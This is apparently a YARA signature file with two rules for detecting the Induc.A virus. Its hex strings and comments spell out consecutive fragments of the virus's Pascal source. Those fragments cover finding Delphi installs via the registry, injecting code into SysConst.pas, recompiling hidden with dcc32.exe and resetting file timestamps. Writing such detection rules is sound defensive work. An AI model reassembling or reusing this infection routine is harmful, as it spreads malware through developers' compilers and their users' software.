
rule Virus_Win32_Induc_A{
	meta:
		description = "Virus:Win32/Induc.A,SIGNATURE_TYPE_PEHSTR_EXT,02 00 02 00 02 00 00 01 00 "
		
	strings :
		$a_00_0 = {77 72 69 74 65 6c 6e 28 66 32 2c 24 24 24 24 2b 73 63 5b 32 34 5d 2b 24 24 24 } //01 00  writeln(f2,$$$$+sc[24]+$$$
		$a_03_1 = {bb 01 00 00 00 be 90 01 04 8b 16 8b c7 e8 90 01 03 ff e8 90 01 03 ff e8 90 01 03 ff 83 c6 04 4b 75 e7 bb 17 00 00 00 90 00 } //00 00 
	condition:
		any of ($a_*)
 
}
rule Virus_Win32_Induc_A_2{
	meta:
		description = "Virus:Win32/Induc.A,SIGNATURE_TYPE_PEHSTR,10 00 10 00 10 00 00 01 00 "
		
	strings :
		$a_01_0 = {6e 6f 74 20 65 6f 66 28 66 31 29 20 64 6f 20 62 65 67 69 6e 20 72 65 61 64 6c 6e 28 66 31 2c 73 29 3b 20 77 72 69 74 65 6c 6e 28 66 32 2c 73 29 3b 20 20 69 66 20 70 6f 73 28 24 69 6d 70 6c 65 6d 65 6e 74 61 74 69 6f 6e 24 2c 73 29 3c 3e 30 } //01 00  not eof(f1) do begin readln(f1,s); writeln(f2,s);  if pos($implementation$,s)<>0
		$a_01_1 = {74 68 65 6e 20 62 72 65 61 6b 3b 65 6e 64 3b 66 6f 72 20 68 3a 3d 20 31 20 74 6f 20 31 20 64 6f 20 77 72 69 74 65 6c 6e 28 66 32 2c 73 63 5b 68 5d 29 3b 66 6f 72 20 68 3a 3d 20 31 20 74 6f 20 32 33 20 64 6f 20 77 72 69 74 65 6c 6e 28 66 32 } //01 00  then break;end;for h:= 1 to 1 do writeln(f2,sc[h]);for h:= 1 to 23 do writeln(f2
		$a_01_2 = {2c 24 24 24 24 2b 73 63 5b 68 5d 2c 24 24 24 2c 24 29 3b 77 72 69 74 65 6c 6e 28 66 32 2c 24 24 24 24 2b 73 63 5b 32 34 5d 2b 24 24 24 29 3b 24 29 3b 66 6f 72 20 68 3a 3d 20 32 20 74 6f 20 32 34 20 64 6f 20 77 72 69 74 65 6c 6e 28 66 32 2c } //01 00  ,$$$$+sc[h],$$$,$);writeln(f2,$$$$+sc[24]+$$$);$);for h:= 2 to 24 do writeln(f2,
		$a_01_3 = {78 28 73 63 5b 68 5d 29 29 3b 63 6c 6f 73 65 66 69 6c 65 28 66 31 29 3b 63 6c 6f 73 65 66 69 6c 65 28 66 32 29 3b 7b 24 49 2b 7d 4d 6f 76 65 46 69 6c 65 28 70 63 68 61 72 28 64 2b 24 64 63 75 24 29 2c 70 63 68 61 72 28 64 2b 24 62 61 6b 24 } //01 00  x(sc[h]));closefile(f1);closefile(f2);{$I+}MoveFile(pchar(d+$dcu$),pchar(d+$bak$
		$a_01_4 = {29 29 3b 20 66 69 6c 6c 63 68 61 72 28 66 2c 73 69 7a 65 6f 66 28 66 29 2c 30 29 3b 20 66 2e 63 62 3a 3d 73 69 7a 65 6f 66 28 66 29 3b 20 66 2e 64 77 46 6c 61 67 73 3a 3d 53 54 41 52 54 46 5f 55 53 45 53 48 4f 57 57 49 4e 44 4f 57 3b 66 2e } //01 00  )); fillchar(f,sizeof(f),0); f.cb:=sizeof(f); f.dwFlags:=STARTF_USESHOWWINDOW;f.
		$a_01_5 = {77 53 68 6f 77 57 69 6e 64 6f 77 3a 3d 53 57 5f 48 49 44 45 3b 62 3a 3d 43 72 65 61 74 65 50 72 6f 63 65 73 73 28 6e 69 6c 2c 70 63 68 61 72 28 65 2b 24 22 24 2b 64 2b 24 70 61 73 22 24 29 2c 30 2c 30 2c 66 61 6c 73 65 2c 30 2c 30 2c 30 2c } //01 00  wShowWindow:=SW_HIDE;b:=CreateProcess(nil,pchar(e+$"$+d+$pas"$),0,0,false,0,0,0,
		$a_01_6 = {66 2c 70 29 3b 69 66 20 62 20 74 68 65 6e 20 57 61 69 74 46 6f 72 53 69 6e 67 6c 65 4f 62 6a 65 63 74 28 70 2e 68 50 72 6f 63 65 73 73 2c 49 4e 46 49 4e 49 54 45 29 3b 4d 6f 76 65 46 69 6c 65 28 70 63 68 61 72 28 64 2b 24 62 61 6b 24 29 2c } //01 00  f,p);if b then WaitForSingleObject(p.hProcess,INFINITE);MoveFile(pchar(d+$bak$),
		$a_01_7 = {70 63 68 61 72 28 64 2b 24 64 63 75 24 29 29 3b 44 65 6c 65 74 65 46 69 6c 65 28 70 63 68 61 72 28 64 2b 24 70 61 73 24 29 29 3b 68 3a 3d 43 72 65 61 74 65 46 69 6c 65 28 70 63 68 61 72 28 64 2b 24 62 61 6b 24 29 2c 30 2c 30 2c 30 2c 33 2c } //01 00  pchar(d+$dcu$));DeleteFile(pchar(d+$pas$));h:=CreateFile(pchar(d+$bak$),0,0,0,3,
		$a_01_8 = {30 2c 30 29 3b 20 20 69 66 20 20 68 3d 44 57 4f 52 44 28 2d 31 29 20 74 68 65 6e 20 65 78 69 74 3b 20 47 65 74 46 69 6c 65 54 69 6d 65 28 68 2c 40 74 31 2c 40 74 32 2c 40 74 33 29 3b 20 43 6c 6f 73 65 48 61 6e 64 6c 65 28 68 29 3b 68 3a 3d } //01 00  0,0);  if  h=DWORD(-1) then exit; GetFileTime(h,@t1,@t2,@t3); CloseHandle(h);h:=
		$a_01_9 = {43 72 65 61 74 65 46 69 6c 65 28 70 63 68 61 72 28 64 2b 24 64 63 75 24 29 2c 32 35 36 2c 30 2c 30 2c 33 2c 30 2c 30 29 3b 69 66 20 68 3d 44 57 4f 52 44 28 2d 31 29 20 74 68 65 6e 20 65 78 69 74 3b 53 65 74 46 69 6c 65 54 69 6d 65 28 68 2c } //01 00  CreateFile(pchar(d+$dcu$),256,0,0,3,0,0);if h=DWORD(-1) then exit;SetFileTime(h,
		$a_01_10 = {40 74 31 2c 40 74 32 2c 40 74 33 29 3b 20 43 6c 6f 73 65 48 61 6e 64 6c 65 28 68 29 3b 20 65 6e 64 3b 20 70 72 6f 63 65 64 75 72 65 20 73 74 3b 20 76 61 72 20 20 6b 3a 48 4b 45 59 3b 63 3a 61 72 72 61 79 20 5b 31 2e 2e 32 35 35 5d 20 6f 66 } //01 00  @t1,@t2,@t3); CloseHandle(h); end; procedure st; var  k:HKEY;c:array [1..255] of
		$a_01_11 = {63 68 61 72 3b 20 20 69 3a 63 61 72 64 69 6e 61 6c 3b 20 72 3a 73 74 72 69 6e 67 3b 20 76 3a 63 68 61 72 3b 20 62 65 67 69 6e 20 66 6f 72 20 76 3a 3d 24 34 24 20 74 6f 20 24 37 24 20 64 6f 20 69 66 20 52 65 67 4f 70 65 6e 4b 65 79 45 78 28 } //01 00  char;  i:cardinal; r:string; v:char; begin for v:=$4$ to $7$ do if RegOpenKeyEx(
		$a_01_12 = {48 4b 45 59 5f 4c 4f 43 41 4c 5f 4d 41 43 48 49 4e 45 2c 70 63 68 61 72 28 24 53 6f 66 74 77 61 72 65 5c 42 6f 72 6c 61 6e 64 5c 44 65 6c 70 68 69 5c 24 2b 76 2b 24 2e 30 24 29 2c 30 2c 4b 45 59 5f 52 45 41 44 2c 6b 29 3d 30 20 74 68 65 6e } //01 00  HKEY_LOCAL_MACHINE,pchar($Software\Borland\Delphi\$+v+$.0$),0,KEY_READ,k)=0 then
		$a_01_13 = {62 65 67 69 6e 20 69 3a 3d 32 35 35 3b 69 66 20 52 65 67 51 75 65 72 79 56 61 6c 75 65 45 78 28 6b 2c 24 52 6f 6f 74 44 69 72 24 2c 6e 69 6c 2c 40 69 2c 40 63 2c 40 69 29 3d 30 20 74 68 65 6e 20 62 65 67 69 6e 20 72 3a 3d 24 24 3b 69 3a 3d } //01 00  begin i:=255;if RegQueryValueEx(k,$RootDir$,nil,@i,@c,@i)=0 then begin r:=$$;i:=
		$a_01_14 = {31 3b 20 77 68 69 6c 65 20 63 5b 69 5d 3c 3e 23 30 20 64 6f 20 62 65 67 69 6e 20 72 3a 3d 72 2b 63 5b 69 5d 3b 69 6e 63 28 69 29 3b 65 6e 64 3b 72 65 28 72 2b 24 5c 73 6f 75 72 63 65 5c 72 74 6c 5c 73 79 73 5c 53 79 73 43 6f 6e 73 74 24 2b } //01 00  1; while c[i]<>#0 do begin r:=r+c[i];inc(i);end;re(r+$\source\rtl\sys\SysConst$+
		$a_01_15 = {24 2e 70 61 73 24 2c 72 2b 24 5c 6c 69 62 5c 73 79 73 63 6f 6e 73 74 2e 24 2c 24 22 24 2b 72 2b 24 5c 62 69 6e 5c 64 63 63 33 32 2e 65 78 65 22 20 24 29 3b 65 6e 64 3b 52 65 67 43 6c 6f 73 65 4b 65 79 28 6b 29 3b 65 6e 64 3b 20 65 6e 64 3b } //00 00  $.pas$,r+$\lib\sysconst.$,$"$+r+$\bin\dcc32.exe" $);end;RegCloseKey(k);end; end;
	condition:
		any of ($a_*)
 
}